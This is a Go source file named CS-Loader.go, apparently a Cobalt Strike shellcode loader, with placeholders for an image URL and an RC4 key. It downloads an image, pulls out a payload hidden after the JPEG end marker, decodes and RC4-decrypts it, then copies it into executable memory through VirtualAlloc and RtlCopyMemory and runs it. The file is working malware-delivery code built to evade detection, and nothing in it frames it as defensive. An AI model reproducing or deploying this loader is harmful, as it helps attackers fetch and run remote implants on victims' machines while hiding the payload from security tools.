//Author: Gality
//Name：CS-Loader.go
//Usage: 
//require: None
//Description: load shellcode from img
//E-mail: gality365@gmail.com
// fix by yumusb
package main

import (
	"io/ioutil"
	"net/http"
	"os"
	b64 "encoding/base64"
	"crypto/rc4"
	"syscall"
	"unsafe"
	"crypto/md5"
	"encoding/hex"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40 // 区域可以执行代码，应用程序可以读写该区域。
	KEY_1                  = 55
	KEY_2                  = 66
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)
func md5V(str string) string  {
    h := md5.New()
    h.Write([]byte(str))
    return hex.EncodeToString(h.Sum(nil))
}
func main()  {
	imageURL := "...your img url..."
	rc4KeyPlain := "...your RC4 key..."
	
	rc4Key := []byte(md5V(rc4KeyPlain))
	resp, err := http.Get(imageURL)
	if err != nil {
		os.Exit(1)
	}
	b, err := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		os.Exit(1)
	}
	idx := 0
	b = []byte(b)
	for i := 0; i < len(b); i++ {
		if b[i] == 255 && b[i+1] == 217 {
			break
		}
		idx++
	}
	raw := string(b[idx+2:])
	// fmt.Print(raw)
	sDec, _ := b64.StdEncoding.DecodeString(raw)
	cipher, _ := rc4.NewCipher(rc4Key)
	cipher.XORKeyStream(sDec, sDec)
	sDec = []byte(sDec)
	sDec, _ = b64.StdEncoding.DecodeString(string(sDec[:]))
	
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(sDec)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&sDec[0])), uintptr(len(sDec)))
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	syscall.Syscall(addr, 0, 0, 0, 0)
}
